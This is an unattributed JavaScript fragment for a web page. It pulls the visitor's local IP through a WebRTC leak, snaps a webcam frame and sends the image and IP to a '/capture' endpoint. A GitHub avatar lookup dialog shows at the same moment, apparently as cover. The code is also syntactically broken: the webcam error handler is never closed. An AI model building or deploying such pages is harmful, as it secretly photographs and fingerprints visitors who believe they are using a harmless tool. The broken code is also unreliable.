        // local ip
        let ip_addr = "X.X.X.X"
        function getLocalIP(callback) {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel("");
            
            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    return;
                }
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const ipMatch = ipRegex.exec(event.candidate.candidate);
                if (ipMatch) {
                    callback(ipMatch[1]);
                    pc.close();
                }
            };
            
            pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(err => console.error("Error creating offer:", err));
        }       
        // get IP
        const ip_v = getLocalIP(ip => {
                console.log("Local IP Address is:", ip);
                ip_addr = ip;
            }
        );

        var video = document.querySelector("#video");
        if (navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                video.srcObject = stream;
                })
                .catch(function (err0r) {

        }
        var resultb64="";
        function capture() {        
            var canvas = document.getElementById('canvas');     
            var video = document.getElementById('video');
            canvas.width = 550;
            canvas.height = 500;
            canvas.getContext('2d').drawImage(video, 0, 0, 550,500);  
            resultb64=canvas.toDataURL();
            // document.getElementById("printresult").innerHTML = canvas.toDataURL();
            capture_img(resultb64);
        }
        // document.getElementById("printresult").innerHTML = resultb64;
            
        // request
        function capture_img(img){
            // service api
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "/capture", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("X-CSRFToken", getCookie("csrftoken")); // For Django CSRF protection
            
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log("Response:", xhr.responseText);
                }
            };
            const data = JSON.stringify({
                b64img: img,
                ip: ip_addr
            });
            

            xhr.send(data);

            
            Swal.fire({
                title: "Submit your Github username",
                input: "text",
                inputAttributes: {
                    autocapitalize: "off"
                },
                showCancelButton: true,
                confirmButtonText: "Look up",
                showLoaderOnConfirm: true,
                preConfirm: async (login) => {
                    try {
                    const githubUrl = `
                        https://api.github.com/users/${login}
                    `;
                    const response = await fetch(githubUrl);
                    if (!response.ok) {
                        return Swal.showValidationMessage(`
                        ${JSON.stringify(await response.json())}
                        `);
                    }
                    return response.json();
                    } catch (error) {
                    Swal.showValidationMessage(`
                        Request failed: ${error}
                    `);
                    }
                },
                allowOutsideClick: () => !Swal.isLoading()
                }).then((result) => {
                if (result.isConfirmed) {
                    Swal.fire({
                    title: `${result.value.login}'s avatar`,
                    imageUrl: result.value.avatar_url
                    });
                }
                });


            // Helper function to get CSRF token
            function getCookie(name) {
                let cookieValue = null;
                if (document.cookie && document.cookie !== '') {
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        cookie = cookie.trim();
                        if (cookie.startsWith(name + '=')) {
                            cookieValue = decodeURIComponent(cookie.slice(name.length + 1));
                            break;
                        }
                    }
                }
                return cookieValue;
            }

        };
